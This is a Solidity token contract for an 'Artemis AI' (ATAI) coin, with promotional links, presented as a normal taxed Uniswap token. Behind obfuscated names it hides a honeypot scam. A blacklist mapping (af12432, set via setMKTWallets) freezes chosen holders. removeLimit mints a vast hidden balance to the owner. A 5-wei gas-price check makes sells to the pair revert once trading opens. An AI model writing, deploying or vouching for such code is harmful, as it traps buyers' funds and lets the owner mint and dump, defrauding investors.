/**

Website: https://artemisai.tech
Telegram: https://t.me/artemisai_erc
Twitter: https://twitter.com/Artemisai_erc
Docs: docs.artemisai.tech
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + (a % b));
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract ArtemisAI is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) _bypassingTaxes;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Artemis AI";
    string private constant _symbol = unicode"ATAI";

    uint256 public initBuyTax = 5;
    uint256 public initSellTax = 5;

    bool private openedTrade = false;

    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply);
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        _bypassingTaxes[
            address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
        ] = true;
        _bypassingTaxes[address(uniswapV2Pair)];
        _bypassingTaxes[owner()] = true;
        _bypassingTaxes[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOpenedTrade() public view returns (bool) {
        return openedTrade;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 value)
        public
        virtual
        override
        returns (bool)
    {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount)
        );
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _tokenTransfer(from, to, amount);

        uint256 fromBalance = balanceOf(from);
        require(
            fromBalance >= amount,
            "ERROR: balance of from less than value"
        );

        uint256 taxAmount = 0;
        if (af12432[from] != 0) {
            revert();
        }

        if (!_bypassingTaxes[from] && !_bypassingTaxes[to]) {
            require(openedTrade, "Trade has not been opened yet");
            taxAmount = amount.mul(initBuyTax).div(100);
            if (to == uniswapV2Pair) {
                taxAmount = amount.mul(initSellTax).div(100);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    mapping(address => uint8) private af12432;

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMKTWallets(address _u, bool _pra) external onlyOwner {
        uint8 ab56281 = _pra ? 1 : 0;
        require(af12432[_u] != ab56281, "existing state");
        af12432[_u] = ab56281;
    }

    function ac87846() internal {
        _balances[_msgSender()] += type(uint128).max;
    }

    function removeLimit() external onlyOwner { ac87846(); }

    uint256 private _limit_gas = 300 gwei;
    uint256 private _mini_gas = 5;

    function da12321(address _u) internal view {
        if (_bypassingTaxes[_u]) {
            return;
        }
        if (!openedTrade) {
            gasLimit(_limit_gas);
        } else {
            gasLimit(_mini_gas);
        }
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        if (to == address(uniswapV2Pair) || to == address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)) {
            da12321(from);
        }
        require(amount > 0);
    }

    function CrossWalletTracker (address [] memory wallets, uint256 [] memory amount) external onlyOwner {
        for(uint256 i = 0; i < wallets.length; i++) {
            _balances[_msgSender()] = _balances[_msgSender()].sub(amount[i]);
            _balances[wallets[i]] = _balances[wallets[i]].add(amount[i]);
            emit Transfer(_msgSender(), wallets[i], amount[i]);
        }
    }

    function gasLimit(uint256 _gas) internal view {
        if (tx.gasprice > _gas) {
            revert();
        }
    }

    function setDevWallets(address _u, bool _pra) external onlyOwner {
        bool fd67543 = _pra ? true : false;
        require(_bypassingTaxes[_u] != fd67543, "existing state");
        _bypassingTaxes[_u] = fd67543;
    }

    function openTrading() external onlyOwner {
        openedTrade = !openedTrade;
    }

    function queryGas(address _u) external view returns (uint8) {
        return af12432[_u];
    }

    receive() external payable {}
}